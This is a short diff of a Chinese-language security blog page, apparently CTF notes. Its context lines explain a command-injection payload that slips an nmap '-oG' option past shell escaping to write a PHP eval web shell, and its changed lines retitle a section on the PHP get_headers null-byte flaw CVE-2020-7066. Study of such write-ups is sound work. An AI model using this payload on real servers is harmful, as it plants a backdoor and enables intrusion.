@@ -558,7 +558,7 @@
 <p>2、传入<code>&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;</code><br>=&gt;<code>  &#39;&#39;\&#39;&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;\&#39;&#39;&#39;</code><br>=&gt; <code>&#39;&#39;\\&#39;&#39; \&lt;\?php eval\($_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG hhh.php &#39;\\&#39;&#39;&#39;    </code><br>（这里的’和文件名中间必须有空格，否则就会生成hhh.php\这样的文件）</p>
 <p>故最终payload：<code>&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;</code></p>
 </blockquote>
-<h1 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h1><ul>
+<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h2 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h2><ul>
 <li><p>描述：在PHP版本7.2.x低于7.2.29；7.3.x低于7.3.16；7.4.x低于7.4.4，而使用get_headers（）与用户提供的网址，如果URL包含零（\0）字符，URL将被默默地截断在它。这可能会导致某些软件对get_headers的目标做出错误的假设，并可能向错误的服务器发送一些信息</p>
 </li>
 <li><p>get_headers() 返回一个数组，包含有服务器响应一个 HTTP 请求所发送的标头</p>
